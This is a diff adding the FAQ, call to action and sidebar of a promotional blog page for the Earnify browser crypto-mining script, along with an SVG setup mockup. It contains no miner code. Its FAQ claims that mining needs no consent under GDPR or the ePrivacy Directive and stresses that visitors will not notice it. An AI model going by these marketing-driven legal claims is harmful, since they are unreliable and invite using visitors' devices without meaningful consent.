+            <text x="72" y="310" fill="#a5f3fc" font-family="monospace" font-size="9">&lt;/script&gt;</text>
+            <text x="72" y="326" fill="#e2e8f0" font-family="monospace" font-size="9">&lt;/body&gt;</text>
+
+            <text x="64" y="347" fill="#e2e8f0" font-family="monospace" font-size="10">&lt;/html&gt;</text>
+
+            <!-- Arrow pointing to script block -->
+            <line x1="344" y1="296" x2="388" y2="296" stroke="#dfe104" stroke-width="2" stroke-dasharray="4,2"/>
+            <polygon points="388,291 398,296 388,301" fill="#dfe104"/>
+
+            <!-- Annotation box -->
+            <rect x="400" y="275" width="250" height="48" rx="4" fill="#131316" stroke="#dfe104" stroke-width="1"/>
+            <text x="408" y="291" fill="#dfe104" font-family="Space Grotesk,sans-serif" font-size="10" font-weight="600">Add script just before &lt;/body&gt;</text>
+            <text x="408" y="306" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="9">No account needed — 1 script tag, done.</text>
+
+            <!-- Right section: Preview panel -->
+            <rect x="356" y="104" width="408" height="286" rx="4" fill="#09090b" stroke="#1c1c1f" stroke-width="1"/>
+            <!-- Preview panel header -->
+            <text x="370" y="122" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="9" font-weight="600" letter-spacing="1">PREVIEW</text>
+            <!-- Desktop mockup -->
+            <rect x="370" y="132" width="380" height="200" rx="4" fill="#131316" stroke="#27272a" stroke-width="1"/>
+            <rect x="385" y="145" width="180" height="14" rx="4" fill="#27272a"/>
+            <rect x="385" y="170" width="350" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="188" width="320" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="206" width="280" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="232" width="150" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="250" width="250" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="268" width="200" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="294" width="120" height="10" rx="3" fill="#1c1c1f"/>
+            <rect x="385" y="312" width="300" height="10" rx="3" fill="#1c1c1f"/>
+
+            <!-- Checkmark indicator -->
+            <circle cx="370" cy="296" r="8" fill="rgba(34,197,94,0.15)"/>
+            <path d="M366 296l3 3 6-6" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+
+            <text x="370" y="350" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="10">Mining runs in background —</text>
+            <text x="370" y="365" fill="#a1a1aa" font-family="Space Grotesk,sans-serif" font-size="10">no visible impact on your page.</text>
+          </svg>
+          <p style="font-size:0.6875rem;color:#3f3f46;text-align:center;margin-top:0.75rem;">Place the script tag just before <code style="background:none;padding:0;border:none;color:#52525b;">&lt;/body&gt;</code> — the miner runs in a background Web Worker.</p>
+        </div>
+
+        <h2 id="faq">FAQ</h2>
+
+        <h3 id="faq-legal">Is browser mining legal in 2026?</h3>
+        <p>Yes, as long as you disclose it to users. Because modern privacy-first miners collect <strong>zero personal data</strong> — no cookies, no IP logging, no fingerprinting — they operate outside GDPR and CCPA consent mandates in most interpretations. That said, always disclose mining in your privacy policy and offer an opt-out. The handful of regulators who have opined on the matter focus on <em>unauthorized</em> mining (cryptojacking), not transparent, opt-in compute monetization.</p>
+
+        <h3 id="faq-earnings">How much can I realistically earn?</h3>
+        <p>At current (mid-2026) difficulty and RVN prices, a site with <strong>1,000 daily visitors</strong> running MinotaurX earns approximately <strong>0.3–0.8 RVN/day</strong> — roughly $5–$20/month. A site with <strong>10,000 daily visitors</strong> earns <strong>2.5–7 RVN/day</strong> — roughly $50–$200/month. These figures move with crypto markets and network difficulty. Browser mining is best treated as <strong>supplemental passive income</strong>, not a primary revenue source.</p>
+
+        <h3 id="faq-performance">Does mining affect my visitors' experience?</h3>
+        <p>Modern browser miners run in <strong>Web Workers</strong> on separate CPU threads. The main thread — responsible for rendering, interaction, and layout — is never blocked. Thread limiting (<code>n−1</code>) and configurable throttling (default 30% idle CPU) ensure the browser remains responsive. Battery-aware detection pauses mining on unplugged laptops at low battery. In practice, the vast majority of visitors will never notice the miner running.</p>
+
+        <h3 id="faq-consent">Do I need a consent banner?</h3>
+        <p>If your miner collects <strong>no personal data</strong>, consent banners are not legally required under GDPR Article 7 or ePrivacy Directive Article 5(3). However, best practice is to <strong>disclose mining in your privacy policy</strong> and provide an opt-out toggle. This protects you against regulatory ambiguity and builds trust with privacy-conscious visitors. The opt-out snippet above takes 30 seconds to implement.</p>
+
+        <div style="margin-top:3rem;padding:2.5rem;border:2px solid #dfe104;text-align:center;background:#09090b;">
+          <h3 style="font-size:1.5rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:1rem;">Ready to Try Browser Mining?</h3>
+          <p style="margin-bottom:1.5rem;color:#a1a1aa;">Add Earnify to your site in 5 minutes — no account needed. Open source. 1% fee. Zero tracking. Start earning passive income from traffic you are already getting.</p>
+          <a href="https://earnify.cc" class="btn btn-accent" style="text-decoration:none;color:#09090b;">Get Started with Earnify</a>
+        </div>
+      </article>
+
+      <aside class="toc-sidebar" style="width:220px;flex-shrink:0;">
+        <div style="position:sticky;top:6rem;">
+          <h4 style="font-size:0.6875rem;text-transform:uppercase;letter-spacing:0.15em;color:#a1a1aa;margin-bottom:1rem;font-weight:600;">Contents</h4>
+          <nav>
+            <a href="#the-question" class="toc-link">The Question</a>
+            <a href="#how-it-works" class="toc-link">How It Works</a>
+            <a href="#revenue-expectations" class="toc-link">Revenue Data</a>
+            <a href="#comparison" class="toc-link">Mining vs Ads vs Donations</a>
+            <a href="#algorithms" class="toc-link">CPU Algorithms</a>
+            <a href="#minotaurx" class="toc-link toc-h3">MinotaurX</a>
+            <a href="#power2b" class="toc-link toc-h3">Power2B</a>
+            <a href="#ghostrider" class="toc-link toc-h3">GhostRider</a>
+            <a href="#setup-guide" class="toc-link">Setup Guide</a>
+            <a href="#faq" class="toc-link">FAQ</a>
+          </nav>
+        </div>
+      </aside>
+    </div>
+
+    <section style="margin-top:5rem;padding-top:3rem;border-top:2px solid #27272a;">
+      <h3 style="font-size:0.75rem;text-transform:uppercase;letter-spacing:0.2em;color:#a1a1aa;margin-bottom:2rem;font-weight:600;">Related Articles</h3>
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.5rem;">
+        <a href="/blog/algorithm-comparison.html" class="card" style="display:block;padding:1.5rem;text-decoration:none;">
+          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:0.75rem;margin-bottom:0.75rem;">
+            <span style="background:#dfe104;color:#09090b;font-size:0.625rem;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;padding:0.2rem 0.6rem;">Technical</span>
+            <span style="font-size:0.6875rem;color:#a1a1aa;">4 min read</span>
+          </div>
+          <h4 class="card-title" style="font-size:1.125rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:0.5rem;color:#FAFAFA;">MinotaurX vs Power2B</h4>
+          <p class="card-desc" style="font-size:0.8125rem;color:#a1a1aa;line-height:1.5;">Compare mining algorithms to find the best fit for your traffic profile.</p>
+        </a>
+        <a href="/blog/web-mining-history.html" class="card" style="display:block;padding:1.5rem;text-decoration:none;">
+          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:0.75rem;margin-bottom:0.75rem;">
+            <span style="background:#dfe104;color:#09090b;font-size:0.625rem;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;padding:0.2rem 0.6rem;">Industry</span>
+            <span style="font-size:0.6875rem;color:#a1a1aa;">4 min read</span>
+          </div>
+          <h4 class="card-title" style="font-size:1.125rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:0.5rem;color:#FAFAFA;">History of Web Mining</h4>
+          <p class="card-desc" style="font-size:0.8125rem;color:#a1a1aa;line-height:1.5;">From Coinhive to Earnify — the complete evolution of browser-based mining.</p>
+        </a>
+        <a href="/blog/coinhive-alternatives.html" class="card" style="display:block;padding:1.5rem;text-decoration:none;">
+          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:0.75rem;margin-bottom:0.75rem;">
+            <span style="background:#dfe104;color:#09090b;font-size:0.625rem;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;padding:0.2rem 0.6rem;">Industry</span>
+            <span style="font-size:0.6875rem;color:#a1a1aa;">5 min read</span>
+          </div>
+          <h4 class="card-title" style="font-size:1.125rem;font-weight:700;text-transform:uppercase;letter-spacing:-0.02em;margin-bottom:0.5rem;color:#FAFAFA;">Coinhive Alternatives</h4>
+          <p class="card-desc" style="font-size:0.8125rem;color:#a1a1aa;line-height:1.5;">Compare the best browser mining platforms in 2026.</p>
+        </a>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const tocLinks = document.querySelectorAll('.toc-link');
+    const headings = document.querySelectorAll('article h2[id], article h3[id]');
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          tocLinks.forEach(link => {
+            link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
+          });
+        }
+      });
+    }, { rootMargin: '-80px 0px -70% 0px' });
+    headings.forEach(h => observer.observe(h));
+  </script>
+</body>
+</html>
